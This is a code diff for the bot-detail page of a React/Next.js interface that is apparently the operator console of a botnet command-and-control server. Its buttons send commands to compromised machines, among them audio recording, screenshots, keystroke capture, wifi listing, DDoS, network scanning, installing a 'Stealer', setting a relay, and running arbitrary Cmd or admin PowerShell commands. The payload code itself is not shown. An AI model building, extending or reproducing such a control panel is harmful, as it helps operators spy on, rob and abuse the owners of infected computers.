@@ -1,21 +1,34 @@
 "use client"
 import {
-    Alert, AlertIcon,
+    Alert,
+    AlertIcon,
     Breadcrumb,
     BreadcrumbItem,
     InputLeftElement,
     BreadcrumbLink,
-    Button, Input, InputGroup, InputRightElement, Text, useToast,
+    Button,
+    Input,
+    InputGroup,
+    InputRightElement,
+    Text,
+    useToast,
+    Tabs,
+    TabList,
+    Tab,
+    TabPanels,
+    TabPanel,
+    InputLeftAddon,
 } from '@chakra-ui/react'
 
 
 import Terminal, {ColorMode, TerminalOutput} from 'react-terminal-ui';
 
 import {useParams} from "next/navigation";
-import {useEffect, useState} from "react";
+import React, {useEffect, useState} from "react";
 
 import C2TerminalOutput from "@/components/C2TerminalOutput";
 import BotTerminalOutput from "@/components/BotTerminalOutput";
+import {sendCommand} from "@/app/bots/[id]/commands";
 
 type TerminalLine = typeof C2TerminalOutput | typeof BotTerminalOutput;
 
@@ -25,7 +38,7 @@ export interface Channel {
     commands: any[]
 }
 
-const backendUrl = "http://10.0.0.24:3000/backend";
+const backendUrl = "http://localhost:4000/backend";
 const pullingInterval = 3000;
 
 export default function BotDetailPage() {
@@ -37,10 +50,23 @@ export default function BotDetailPage() {
     const [loading, setLoading] = useState<boolean>(false)
     const [command, setCommand] = useState<string>("")
 
-    const handleCommandChange = (event) => {
-        setCommand(event.target.value)
-        console.log(event.target.value)
-    }
+
+    /* forms */
+    const [startIp, setStartIp] = useState<string>("")
+    const [endIp, setEndIp] = useState<string>("")
+
+    const [ping, setPing] = useState<string>("")
+
+    const [relay, setRelay] = useState<string>("")
+    const [pullingRate, setPullingRate] = useState<number>(10)
+
+
+    const handleCommandChange = (event: React.ChangeEvent<HTMLInputElement>) => setCommand(event.target.value);
+    const handleStartIpChange = (event: React.ChangeEvent<HTMLInputElement>) => setStartIp(event.target.value);
+    const handleEndIpChange = (event: React.ChangeEvent<HTMLInputElement>) => setEndIp(event.target.value);
+    const handlePingChange = (event: React.ChangeEvent<HTMLInputElement>) => setPing(event.target.value);
+    const handleRelayChange = (event: React.ChangeEvent<HTMLInputElement>) => setRelay(event.target.value);
+    const handlePullingRateChange = (event: React.ChangeEvent<HTMLInputElement>) => setPullingRate(event.target.value);
 
 
 
@@ -154,7 +180,7 @@ export default function BotDetailPage() {
     async function handlePullingRate() {
 
         const res =  await sendCommand(currentBot, "SetPullingRate", {
-            command: "whoami"
+            seconds: +pullingRate
         })
 
         commandSent()
@@ -162,8 +188,9 @@ export default function BotDetailPage() {
 
     async function handleGateway() {
         const res =  await sendCommand(currentBot, "Gateway", {
-            command: "whoami"
+            ip: relay
         })
+        setRelay("")
 
         commandSent()
     }
@@ -243,12 +270,8 @@ export default function BotDetailPage() {
     }
 
 
-
-
-
-
     return (
-        <main className="flex flex-wrap gap-4">
+        <main className="flex flex-wrap gap-4 basis-full">
             <div className={"flex basis-full bg-gray-400  p-6 "}>
                 <Breadcrumb>
                     <BreadcrumbItem>
@@ -256,7 +279,7 @@ export default function BotDetailPage() {
                     </BreadcrumbItem>
 
                     <BreadcrumbItem isCurrentPage>
-                        <BreadcrumbLink href={'/bots/'+currentBot}>Bot #{currentBot}</BreadcrumbLink>
+                        <BreadcrumbLink href={'/bots/' + currentBot}>Bot #{currentBot}</BreadcrumbLink>
                     </BreadcrumbItem>
                 </Breadcrumb>
             </div>
@@ -268,63 +291,107 @@ export default function BotDetailPage() {
                         <Button colorScheme='red' onClick={handleClear} isLoading={loading}>Clear Command</Button>
                     </div>
                 </div>
-                <div className={"flex basis-full gap-2 flex-wrap"}>
-                    <div className={"flex gap-2 basis-full"}>
-                        <Button colorScheme='blue' onClick={handleSystemInfo}>Get System Info</Button>
-                        <Button colorScheme='blue' onClick={handlePublicIp}>Get Public Ip</Button>
-                        <Button colorScheme='blue' onClick={handlePrivateIp}>Get Private Ip</Button>
-                    </div>
+            </div>
+            <div className={"flex basis-full "}>
+                <Tabs className={'w-full pa-2'} variant='enclosed'>
+                    <TabList>
+                        <Tab>Actions</Tab>
+                        <Tab>Analysis</Tab>
+                        <Tab>Config</Tab>
+                        <Tab>Install tools</Tab>
+                    </TabList>
 
-                    <div className={"flex gap-2 basis-full"}>
-                        <Button colorScheme='green' onClick={handleAudio}>Record audio</Button>
-                        <Button colorScheme='green' onClick={handleScreen}>Screenshot</Button>
-                        <Button colorScheme='green' onClick={handleWifi}>Wifi list</Button>
-                        <Button colorScheme='green' onClick={handleDdos}>Ddos</Button>
-                        <Button colorScheme='green' onClick={handleNetworkScan}>Network Scan</Button>
-                        <Button colorScheme='green' onClick={handleKeyboardData}>Keyboard Data</Button>
-                        <Button colorScheme='green' onClick={handleKeyboardData}>Grab file</Button>
-                        <Button colorScheme='green' onClick={handleKeyboardData}>Send file</Button>
+                    <TabPanels>
+                        <TabPanel className={"flex gap-2"}>
+                            <Button colorScheme='green' onClick={handleKeyboardData}>Grab file</Button>
+                            <Button colorScheme='green' onClick={handleKeyboardData}>Send file</Button>
+                            <Button colorScheme='green' onClick={handleDdos}>Ddos</Button>
+                            <Button colorScheme='green' onClick={handleAudio}>Record audio</Button>
+                            <Button colorScheme='green' onClick={handleScreen}>Screenshot</Button>
+                        </TabPanel>
+                        <TabPanel>
+                            <div className={"flex gap-2"}>
+                                <Button colorScheme='blue' onClick={handleSystemInfo}>Get System Info</Button>
+                                <Button colorScheme='blue' onClick={handlePublicIp}>Get Public Ip</Button>
+                                <Button colorScheme='blue' onClick={handlePrivateIp}>Get Private Ip</Button>
+                                <Button colorScheme='blue' onClick={handleKeyboardData}>Keyboard Data</Button>
+                                <Button colorScheme='blue' onClick={handleWifi}>Wifi list</Button>
+                            </div>
+                            <br/>
+                            <InputGroup>
+                                <Input placeholder='Enter ip to ping' value={ping} onChange={handlePingChange} />
+                                <InputRightElement width='4rem'>
+                                    <Button colorScheme='yellow'>Ping</Button>
+                                </InputRightElement>
+                            </InputGroup>
+                            <br/>
+                            <div className={"flex gap-2"}>
+                                <InputGroup width={"350"}>
+                                    <InputLeftAddon>
+                                        Start IP
+                                    </InputLeftAddon>
+                                    <Input type='text' placeholder='192.168.1.1' value={startIp} onChange={handleStartIpChange} />
+                                </InputGroup>
+                                <InputGroup width={"350"}>
+                                    <InputLeftAddon>
+                                        End IP
+                                    </InputLeftAddon>
+                                    <Input type='text' placeholder='192.168.1.255' value={endIp} onChange={handleEndIpChange} />
+                                </InputGroup>
+                                <Button colorScheme='green' onClick={handleNetworkScan}>Network Scan</Button>
+                            </div>
 
+                        </TabPanel>
+                        <TabPanel>
+                            <p>Config</p>
+                            <InputGroup>
+                                <Input placeholder='Enter new value' value={relay} onChange={handleRelayChange}/>
+                                <InputRightElement width='6rem'>
+                                    <Button colorScheme='yellow' onClick={handleGateway}>Set Relay</Button>
+                                </InputRightElement>
+                            </InputGroup>
+                            <br/>
+                            <InputGroup>
+                            <Input type={"number"} placeholder='Enter new value' value={pullingRate} onChange={handlePullingRateChange} />
+                            <InputRightElement width='6rem'>
+                                <Button colorScheme='yellow' onClick={handlePullingRate}>Pulling Rate</Button>
+                            </InputRightElement>
+                        </InputGroup>
+                        </TabPanel>
+                        <TabPanel className={"flex gap-2"}>
+                            <Button colorScheme='yellow' onClick={handleInstallIpScanner}>Install Ip Scanner</Button>
+                            <Button colorScheme='yellow' onClick={handleInstallIpScanner}>Install Stealer</Button>
+                            <Button colorScheme='yellow' onClick={handleInstallPython}>Install Python</Button>
+                        </TabPanel>
+                    </TabPanels>
+                </Tabs>
+            </div>
+                <div className={"flex basis-full flex-wrap p-4 gap-4"}>
+                    <div className={"flex basis-full"}>
+                        <InputGroup size='md'>
+                            <InputLeftElement
+                                pointerEvents='none'
+                                color='gray.300'
+                                fontSize='1.2em'
+                            >
+                                $
+                            </InputLeftElement>
+                            <Input pr='4.5rem' value={command} onChange={handleCommandChange}/>
+                            <InputRightElement className={"gap-2"} width='20rem'>
+                                <Button size='sm' onClick={handleCmd}>Send as Cmd</Button>
+                                <Button size='sm' onClick={handleAdminPowershell}>Send as Admin Powershell</Button>
+                            </InputRightElement>
+                        </InputGroup>
                     </div>
-                    <div className={"flex gap-2 basis-full"}>
-                        <Button colorScheme='yellow' onClick={handleFile}>Get File</Button>
-                        <Button colorScheme='yellow' onClick={handlePing}>Ping</Button>
-                        <Button colorScheme='yellow' onClick={handleGateway}>Set Relay</Button>
-                        <Button colorScheme='yellow' onClick={handlePullingRate}>Pulling Rate</Button>
-                        <Button colorScheme='yellow' onClick={handleInstallIpScanner}>Install Ip Scanner</Button>
-                        <Button colorScheme='yellow' onClick={handleInstallIpScanner}>Install Stealer</Button>
-                        <Button colorScheme='yellow' onClick={handleInstallPython}>Install Python</Button>
-                    </div>
-
                 </div>
-            </div>
-
-            <div className={"flex basis-full flex-wrap p-4 gap-4"}>
-                <div className={"flex basis-full"}>
-                    <InputGroup size='md'>
-                        <InputLeftElement
-                            pointerEvents='none'
-                            color='gray.300'
-                            fontSize='1.2em'
-                        >
-                            $
-                        </InputLeftElement>
-                        <Input pr='4.5rem'   value={command} onChange={handleCommandChange}/>
-                        <InputRightElement className={"gap-2"} width='20rem'>
-                            <Button size='sm' onClick={handleCmd} >Send as Cmd</Button>
-                            <Button size='sm' onClick={handleAdminPowershell}>Send as Admin Powershell</Button>
-                        </InputRightElement>
-                    </InputGroup>
+                <div className={"flex basis-full flex-wrap p-4"}>
+                    <Terminal name='Bot channel' colorMode={ColorMode.Dark}>
+                        {channel && channel.messages.map((m) => {
+                            return renderMessage(m)
+                        })}
+                    </Terminal>
                 </div>
-            </div>
-            <div className={"flex basis-full flex-wrap p-4"}>
-                <Terminal name='Bot channel' colorMode={ ColorMode.Dark }>
-                    {channel && channel.messages.map((m) => {
-                        return renderMessage(m)
-                    })}
-                </Terminal>
-            </div>
         </main>
-    )
+)
 
 }
